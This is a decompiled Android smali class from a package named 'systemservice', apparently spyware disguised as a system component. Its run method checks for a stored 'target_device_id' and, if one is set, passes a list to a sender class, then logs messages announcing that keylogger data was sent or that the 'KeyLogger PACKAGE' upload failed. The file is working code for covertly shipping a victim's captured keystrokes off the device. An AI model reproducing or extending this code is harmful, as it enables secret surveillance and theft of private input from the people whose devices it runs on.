.class Lcom/systemservice/common/boostReceiver/h;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/common/boostReceiver/i;->run()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcom/systemservice/common/boostReceiver/i;


# direct methods
.method constructor <init>(Lcom/systemservice/common/boostReceiver/i;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/common/boostReceiver/h;->a:Lcom/systemservice/common/boostReceiver/i;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    :try_start_0
    iget-object v0, p0, Lcom/systemservice/common/boostReceiver/h;->a:Lcom/systemservice/common/boostReceiver/i;

    iget-object v0, v0, Lcom/systemservice/common/boostReceiver/i;->b:Lcom/systemservice/common/boostReceiver/UINotificationService;

    invoke-static {v0}, Lcom/systemservice/common/boostReceiver/UINotificationService;->a(Lcom/systemservice/common/boostReceiver/UINotificationService;)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v1, "target_device_id"

    const-string v2, ""

    invoke-interface {v0, v1, v2}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_1

    new-instance v0, Lcom/systemservice/a/c/h/j;

    iget-object v1, p0, Lcom/systemservice/common/boostReceiver/h;->a:Lcom/systemservice/common/boostReceiver/i;

    iget-object v1, v1, Lcom/systemservice/common/boostReceiver/i;->a:Landroid/content/Context;

    const/4 v2, 0x0

    invoke-direct {v0, v1, v2}, Lcom/systemservice/a/c/h/j;-><init>(Landroid/content/Context;Z)V

    iget-object v1, p0, Lcom/systemservice/common/boostReceiver/h;->a:Lcom/systemservice/common/boostReceiver/i;

    iget-object v1, v1, Lcom/systemservice/common/boostReceiver/i;->a:Landroid/content/Context;

    iget-object v2, p0, Lcom/systemservice/common/boostReceiver/h;->a:Lcom/systemservice/common/boostReceiver/i;

    iget-object v2, v2, Lcom/systemservice/common/boostReceiver/i;->b:Lcom/systemservice/common/boostReceiver/UINotificationService;

    invoke-static {v2}, Lcom/systemservice/common/boostReceiver/UINotificationService;->b(Lcom/systemservice/common/boostReceiver/UINotificationService;)Ljava/util/List;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lcom/systemservice/a/c/h/j;->c(Landroid/content/Context;Ljava/util/List;)I

    move-result v0

    const/4 v1, 0x1

    if-ne v0, v1, :cond_0

    sget-object v1, Lcom/systemservice/a/a/j;->h:Lorg/apache/log4j/Logger;

    const-string v2, "Notification of KeyLogger: SEND notification of KeyLogger successful"

    invoke-virtual {v1, v2}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    iget-object v1, p0, Lcom/systemservice/common/boostReceiver/h;->a:Lcom/systemservice/common/boostReceiver/i;

    iget-object v1, v1, Lcom/systemservice/common/boostReceiver/i;->b:Lcom/systemservice/common/boostReceiver/UINotificationService;

    invoke-static {v1}, Lcom/systemservice/common/boostReceiver/UINotificationService;->c(Lcom/systemservice/common/boostReceiver/UINotificationService;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "SEND notification of KeyLogger successful"

    :goto_0
    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1

    :cond_0
    iget-object v1, p0, Lcom/systemservice/common/boostReceiver/h;->a:Lcom/systemservice/common/boostReceiver/i;

    iget-object v1, v1, Lcom/systemservice/common/boostReceiver/i;->b:Lcom/systemservice/common/boostReceiver/UINotificationService;

    invoke-static {v1}, Lcom/systemservice/common/boostReceiver/UINotificationService;->c(Lcom/systemservice/common/boostReceiver/UINotificationService;)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v3, "SEND KeyLogger PACKAGE ERROR"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    goto :goto_0

    :goto_1
    iget-object v1, p0, Lcom/systemservice/common/boostReceiver/h;->a:Lcom/systemservice/common/boostReceiver/i;

    iget-object v1, v1, Lcom/systemservice/common/boostReceiver/i;->b:Lcom/systemservice/common/boostReceiver/UINotificationService;

    invoke-static {v1}, Lcom/systemservice/common/boostReceiver/UINotificationService;->c(Lcom/systemservice/common/boostReceiver/UINotificationService;)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "ret_code = "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :catch_0
    move-exception v0

    iget-object v1, p0, Lcom/systemservice/common/boostReceiver/h;->a:Lcom/systemservice/common/boostReceiver/i;

    iget-object v1, v1, Lcom/systemservice/common/boostReceiver/i;->b:Lcom/systemservice/common/boostReceiver/UINotificationService;

    invoke-static {v1}, Lcom/systemservice/common/boostReceiver/UINotificationService;->c(Lcom/systemservice/common/boostReceiver/UINotificationService;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_1
    :goto_2
    return-void
.end method
